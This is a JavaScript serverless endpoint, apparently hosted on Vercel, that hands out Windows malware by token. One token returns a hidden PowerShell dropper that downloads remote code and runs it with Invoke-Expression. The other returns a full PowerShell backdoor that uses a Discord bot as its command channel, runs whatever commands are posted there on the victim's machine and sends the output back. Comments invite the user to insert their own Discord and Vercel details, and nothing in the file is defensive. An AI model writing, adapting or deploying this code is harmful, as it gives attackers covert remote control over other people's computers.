export default function handler(req, res) {
  try {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
    
    if (req.method === "OPTIONS") {
      res.status(200).end();
      return;
    }
    
    if (req.method !== "GET") {
      return res.status(405).json({ error: "Method not allowed" });
    }
    
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ error: "Unauthorized: No token provided" });
    }
    
    const tokenParts = authHeader.split(" ");
    if (tokenParts.length !== 2 || tokenParts[0] !== "Bearer") {
      return res.status(401).json({ error: "Unauthorized: Invalid token format" });
    }
    
    const token = tokenParts[1];
    const VALID_TOKEN = process.env.VALID_TOKEN || "yyyyyy"; //Main script token
    const VALID_TOKEN_1 = process.env.VALID_TOKEN_1 || "xxxxxx"; //Dropper token
    
    if (token === VALID_TOKEN_1) {
      //change the URL to your Vercel project and your Dropper Token
      const dropperScript = `Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command \`$r = Invoke-WebRequest https://xyz.vercel.app -Headers @{'Authorization'='Bearer xxxxxx'}; Invoke-Expression \`$r.Content" -WindowStyle Hidden`;
      res.setHeader("Content-Type", "text/plain");
      return res.status(200).send(dropperScript);
    } else if (token === VALID_TOKEN) {
      //replace $t, $c, $s, $categoryID with your Data
      const powershellScript = `$t="Discord bot token";$c="discord channel ID";$s="discord Server ID";$categoryId="Discord category ID";function sndmsg{param($message);$w.Headers.Add("Content-Type","application/json");$j=@{"content"=$message}|ConvertTo-Json;$x=$w.UploadString($u,"POST",$j)};function createChannel{param($channelName);$createChannelUrl="https://discord.com/api/v10/guilds/$s/channels";$w.Headers.Add("Content-Type","application/json");$j=@{"name"=$channelName;"type"=0;"parent_id"=$categoryId}|ConvertTo-Json;$response=$w.UploadString($createChannelUrl,"POST",$j);$channel=$response|ConvertFrom-Json;return $channel.id};function deleteChannel{param($channelId);$deleteChannelUrl="https://discord.com/api/v10/channels/$channelId";$w.Headers.Add("Content-Type","application/json");$w.UploadString($deleteChannelUrl,"DELETE","")};$w=New-Object System.Net.WebClient;$w.Headers.Add("Authorization","Bot $t");trap{[void]$_;exit};try{$computerName=$env:COMPUTERNAME;$windowsUser=$env:USERNAME;$channelName="$windowsUser";$newChannelId=createChannel -channelName $channelName;$c=$newChannelId;while($true){$u="https://discord.com/api/v10/channels/$c/messages";$m=$w.DownloadString($u);$r=($m|ConvertFrom-Json)[0];if(-not $r.author.bot){$a=$r.timestamp;$m=$r.content;if($a -ne $p){$p=$a;try{$o=iex $m 2>&1|Out-String}catch{$o=$null};$l=$o -split "\`n";$s=0;$b=@();foreach($z in $l){$y=[System.Text.Encoding]::Unicode.GetByteCount($z);if(($s+$y)-gt 1900){sndmsg -message "\`\`\`\`\`\`$($b -join \`"\`n\`")\`\`\`\`\`\`";sleep 1;$s=0;$b=@()};$b+=$z;$s+=$y};if($b.Count-gt 0){sndmsg -message "\`\`\`\`\`\`$($b -join \`"\`n\`")\`\`\`\`\`\`"}}};Sleep 3}}finally{if($newChannelId){try{deleteChannel -channelId $newChannelId}catch{[void]$_}}}`;
      res.setHeader("Content-Type", "text/plain");
      return res.status(200).send(powershellScript);
    } else {
      return res.status(403).json({ error: "Forbidden: Invalid Token" });
    }
  } catch (error) {
    console.error("Error in handler:", error);
    return res.status(500).json({ error: "Internal Server Error", details: error.message });
  }
}
